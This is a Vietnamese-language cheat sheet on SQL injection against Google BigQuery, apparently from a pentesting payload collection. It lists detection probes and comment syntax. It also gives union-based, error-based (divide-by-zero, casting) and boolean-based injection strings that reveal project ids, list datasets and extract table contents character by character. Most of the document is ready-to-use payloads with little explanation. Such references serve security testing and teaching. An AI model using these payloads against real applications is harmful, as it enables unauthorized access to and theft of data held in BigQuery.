# SQL Injection trên Google BigQuery
> SQL Injection trên Google BigQuery là một loại lỗ hổng bảo mật, trong đó kẻ tấn công có thể thực thi các câu truy vấn SQL tùy ý trên cơ sở dữ liệu Google BigQuery bằng cách thao túng dữ liệu đầu vào của người dùng được đưa vào câu truy vấn SQL mà không được kiểm tra, làm sạch đúng cách. Điều này có thể dẫn đến truy cập dữ liệu trái phép, thao túng dữ liệu, hoặc các hành vi độc hại khác.

## Tóm tắt
* [Phát hiện](#detection)
* [Chú thích trong BigQuery](#bigquery-comment)
* [Khai thác dựa trên Union](#bigquery-union-based)
* [Khai thác dựa trên lỗi](#bigquery-error-based)
* [Khai thác dựa trên Boolean](#bigquery-boolean-based)
* [Khai thác dựa trên thời gian](#bigquery-time-based)
* [Tài liệu tham khảo](#references)

## Phát hiện
* Dùng dấu nháy đơn cổ điển để kích hoạt lỗi: `'`
* Nhận diện BigQuery thông qua ký hiệu dấu backtick: ```SELECT .... FROM `` AS ...```

| Câu truy vấn SQL                                       | Mô tả                                                |
| ------------------------------------------------------- | ----------------------------------------------------- |
| `SELECT @@project_id`                                    | Thu thập project id                                    |
| `SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA`    | Thu thập tất cả tên các dataset                        |
| `select * from project_id.dataset_name.table_name`       | Thu thập dữ liệu từ project id & dataset cụ thể        |

## Chú thích trong BigQuery
| Loại                       | Mô tả              |
| -------------------------- | ------------------ |
| `#`                        | Chú thích dạng Hash |
| `/* PostgreSQL Comment */` | Chú thích kiểu C    |

## Khai thác dựa trên Union
```ps1
UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT 'asd'),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
' GROUP BY column_name UNION ALL SELECT column_name,1,1 FROM  (select column_name AS new_name from `project_id.dataset_name.table_name`) AS A GROUP BY column_name#
```

## Khai thác dựa trên lỗi
| Câu truy vấn SQL                                          | Mô tả              |
| ---------------------------------------------------------- | ------------------- |
| `' OR if(1/(length((select('a')))-1)=1,true,false) OR '`  | Chia cho không       |
| `select CAST(@@project_id AS INT64)`                        | Ép kiểu (Casting)    |

## Khai thác dựa trên Boolean
```ps1
' WHERE SUBSTRING((select column_name from `project_id.dataset_name.table_name` limit 1),1,1)='A'#
```

## Khai thác dựa trên thời gian
* Các hàm dựa trên thời gian không tồn tại trong cú pháp của BigQuery.

## Tài liệu tham khảo
* [BigQuery SQL Injection Cheat Sheet - Ozgur Alp - February 14, 2022](https://web.archive.org/web/20260222133721/https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac)
* [BigQuery Documentation - Query Syntax - October 30, 2024](https://web.archive.org/web/20251109151650/https://cloud.google.com/bigquery/docs/reference/standard-sql/query-syntax)
* [BigQuery Documentation - Functions and Operators - October 30, 2024](https://web.archive.org/web/20170524193028/https://cloud.google.com/bigquery/docs/reference/standard-sql/functions-and-operators)
* [Akamai Web Application Firewall Bypass Journey: Exploiting "Google BigQuery" SQL Injection Vulnerability - Duc Nguyen - March 31, 2020](https://web.archive.org/web/20260225150843/https://hackemall.live/index.php/2020/03/31/akamai-web-application-firewall-bypass-journey-exploiting-google-bigquery-sql-injection-vulnerability/)
